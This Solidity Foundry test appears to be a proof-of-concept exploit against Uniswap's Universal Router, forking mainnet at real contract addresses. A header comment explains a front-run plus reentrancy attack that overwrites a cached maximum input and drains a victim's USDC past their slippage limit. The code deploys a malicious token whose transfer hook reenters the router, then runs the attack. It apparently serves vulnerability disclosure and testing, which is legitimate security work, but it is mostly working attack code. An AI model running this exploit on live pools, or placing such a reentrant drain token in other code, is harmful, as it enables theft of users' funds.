// SPDX-License-Identifier: UNLICENSED
pragma solidity >0.7.0 <0.9.0;

import "forge-std/Test.sol";
import "@uniswap/v3-core/contracts/interfaces/IUniswapV3Factory.sol";
import "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import "universal-router/UniversalRouter.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

import "./TickMath.sol";
import "./Interfaces.sol";

/*
1. Attacker controls token X, and creates a uniswap v3 pool for (USDC, X).
2. Bob wants to buy a few Xs in case it moons.
3. Bob uses the universal router to buy X, using `V3_SWAP_EXACT_OUT`.
4. Attacker frontruns Bob, manipulating X's reserves so that its price increases (could be done just buying it or manipulating the pool's balance if the attacker has the ability to do that).
5. The router will cache `amountInMaximum` inside the `_swap` function and then call `swap` from the uniswap pool.
6. The uniswap pool will call transfer on token X, which will do an arbitrary `V3_SWAP_EXACT_OUT` in order to overwritte `maxAmountInCached` (it will get set to `type(uint256).max` at the end of the reentrant swap).
7. The execution of the original swap will continue, and the `uniswapV3SwapCallback` will be called, but with a higher `amountToPay` than expected (to cover for X's price increase).
8. The check for `(amountToPay > maxAmountInCached)` will not revert, and more money will be taken from Bob than what he specified originally. This could lead to Bob's USDC balance being completely drained.

Note: Token X doesn't need to be fully controlled by the attacker or be a malicious token, there only needs to be a way for the attacker to receive a callback when a transfer is being performed and for the attacker to be able to significantly manipulate X's spot price.*/

UniversalRouter constant UNIVERSAL_ROUTER = UniversalRouter(payable(0x0000000052BE00bA3a005edbE83a0fB9aaDB964C));
IUniswapV3Factory constant UNISWAP_V3_FACTORY = IUniswapV3Factory(0x1F98431c8aD98523631AE4a59f267346ea31F984);
INonfungiblePositionManager constant nonfungiblePositionManager =
    INonfungiblePositionManager(0xC36442b4a4522E871399CD717aBDD847Ab11FE88);
IPermit2 constant permit2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);

IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
IERC20 constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

uint256 constant FORK_BLOCK_NUMBER = 15991275;


contract LP is IERC721Receiver {
    int24 private constant TICK_SPACING = 10;

    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    function mintNewPosition(
        IERC20 token0,
        IERC20 token1,
        uint256 amount0ToAdd,
        uint256 amount1ToAdd,
        int24 minTick,
        int24 maxTick
    ) external returns (uint256 tokenId, uint128 liquidity, uint256 amount0, uint256 amount1) {
        token0.transferFrom(msg.sender, address(this), amount0ToAdd);
        token1.transferFrom(msg.sender, address(this), amount1ToAdd);

        token0.approve(address(nonfungiblePositionManager), amount0ToAdd);
        token1.approve(address(nonfungiblePositionManager), amount1ToAdd);

        INonfungiblePositionManager.MintParams memory params = INonfungiblePositionManager.MintParams({
            token0: address(token0),
            token1: address(token1),
            fee: 500,
            tickLower: (minTick / TICK_SPACING) * TICK_SPACING,
            tickUpper: (maxTick / TICK_SPACING) * TICK_SPACING,
            amount0Desired: amount0ToAdd,
            amount1Desired: amount1ToAdd,
            amount0Min: 0,
            amount1Min: 0,
            recipient: address(this),
            deadline: block.timestamp
        });

        (tokenId, liquidity, amount0, amount1) = nonfungiblePositionManager.mint(params);
    }

    function removePosition(uint256 tokenId, uint128 liquidity) external {
        INonfungiblePositionManager.DecreaseLiquidityParams memory params = INonfungiblePositionManager
            .DecreaseLiquidityParams({
            tokenId: tokenId,
            liquidity: liquidity,
            amount0Min: 0,
            amount1Min: 0,
            deadline: block.timestamp
        });

        nonfungiblePositionManager.decreaseLiquidity(params);
    }
}

contract BadToken is ERC20("BAD", "BAD") {
    bool public reenter;

    function setReenter(bool _reenter) external {
        reenter = _reenter;
    }

    function _beforeTokenTransfer(address, address, uint256) internal override {
        if (reenter) {
            reenter = false;
            WETH.approve(address(permit2), type(uint256).max);
            permit2.approve(address(WETH), address(UNIVERSAL_ROUTER), type(uint160).max, type(uint48).max);

            bytes memory commands = abi.encodePacked(bytes1(uint8(Commands.V3_SWAP_EXACT_OUT)));

            bytes[] memory inputs = new bytes[](1);
            inputs[0] = abi.encode(
                Constants.MSG_SENDER, // recipient
                1, // amount out
                type(uint256).max, // amount in max
                abi.encodePacked(address(USDC), uint24(500), address(WETH)), // path
                true
            );

            UNIVERSAL_ROUTER.execute(commands, inputs);
        }
    }
}

contract HackTest is Test {
    BadToken badtoken;
    address attacker = address(1);
    address victim = address(2);
    LP lp;

    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("mainnet"), FORK_BLOCK_NUMBER);
        lp = new LP();
    }

    function testHack() public {
        badtoken = new BadToken();

        // Create BAD / USDC pool
        console.log("Creating BAD / USDC pool\n");
      
        IUniswapV3Pool pool = IUniswapV3Pool(UNISWAP_V3_FACTORY.createPool(address(badtoken), address(USDC), 500));

        // 1 bad token ~ 1000 USDC
        uint160 sqrtPricex96A = 2505414483750479311864138; // sqrt(1000 * 1e6 / 1e18) * 2 ** 96

        console.log("Initial price is 1000 USDC per BAD token\n");
        pool.initialize(sqrtPricex96A);

        deal(address(USDC), attacker, 1000000 * 1e6);
        deal(address(badtoken), attacker, 1000000 * 1e18, true);
        deal(address(USDC), victim, 1000000 * 1e6);
        deal(address(WETH), address(badtoken), 1e18);

        startHoax(attacker);
        USDC.approve(address(lp), type(uint256).max);
        badtoken.approve(address(lp), type(uint256).max);

        int24 tickA = TickMath.getTickAtSqrtRatio(sqrtPricex96A);
    
        (, , uint256 amount0, uint256 amount1) =
            lp.mintNewPosition(badtoken, USDC, 1e18, 1000e6, tickA - 100, tickA + 100);

        // Provide liquidity at a higher usd price
        uint160 sqrtPricex96B = 79228162514264337593543950; // sqrt(1000000 * 1e6 / 1e18) * 2 ** 96
        int24 tickB = TickMath.getTickAtSqrtRatio(sqrtPricex96B);

        uint256 tokenIdB;
        (tokenIdB,, amount0, amount1) = lp.mintNewPosition(badtoken, USDC, 10e18, 1000e6, tickB - 100, tickB + 100);

        USDC.approve(address(permit2), type(uint256).max);
        permit2.approve(address(USDC), address(UNIVERSAL_ROUTER), type(uint160).max, type(uint48).max);

        // Victim wants to do regular swap, tries to get 0.01 BAD for at most 11 USDC
        console.log("Victim wants to swap 0.01 BAD for at most 11 USDC");
        // Attacker frontruns and increases the price of BAD
        console.log("Attacker frontruns and increases the price of BAD\n");

        (uint256 sqrtPriceX96,,,,,,) = pool.slot0();
        uint256 price = (uint256(sqrtPriceX96) ** 2 * 1e18) >> (96 * 2);
        console.log("Price before swap (in USDC)", price / 1e6);

        console.log("ATTACKER SWAPS...");
        swapExactOut(address(USDC), address(badtoken), 1e18, type(uint256).max);

        (sqrtPriceX96,,,,,,) = pool.slot0();
        price = (uint256(sqrtPriceX96) ** 2 * 1e18) >> (96 * 2);
        console.log("Price after swap (in USDC)", price / 1e6);
        console.log("\n");

        badtoken.setReenter(true);

        vm.stopPrank();

        startHoax(victim);

        USDC.approve(address(permit2), type(uint256).max);
        permit2.approve(address(USDC), address(UNIVERSAL_ROUTER), type(uint160).max, type(uint48).max);

        console.log("Victim's USDC balance before swap", USDC.balanceOf(victim) / 1e6);
        // Victim does a regular swap, tries to get 0.01 BAD for at most 11 USDC
        console.log("VICTIM SWAPS...");
        swapExactOut(address(USDC), address(badtoken), 1e18, 1100e6);
        console.log("Victim's USDC balance after swap", USDC.balanceOf(victim) / 1e6);
    }

    function swapExactOut(address src, address dst, uint256 amountOut, uint256 amountInMax) internal {
        bytes memory commands = abi.encodePacked(bytes1(uint8(Commands.V3_SWAP_EXACT_OUT)));

        bytes[] memory inputs = new bytes[](1);
        inputs[0] = abi.encode(
            Constants.MSG_SENDER, // recipient
            amountOut, // amount out
            amountInMax, // amount in max
            abi.encodePacked(address(dst), uint24(500), address(src)), // path
            true
        );

        UNIVERSAL_ROUTER.execute(commands, inputs);
    }
}
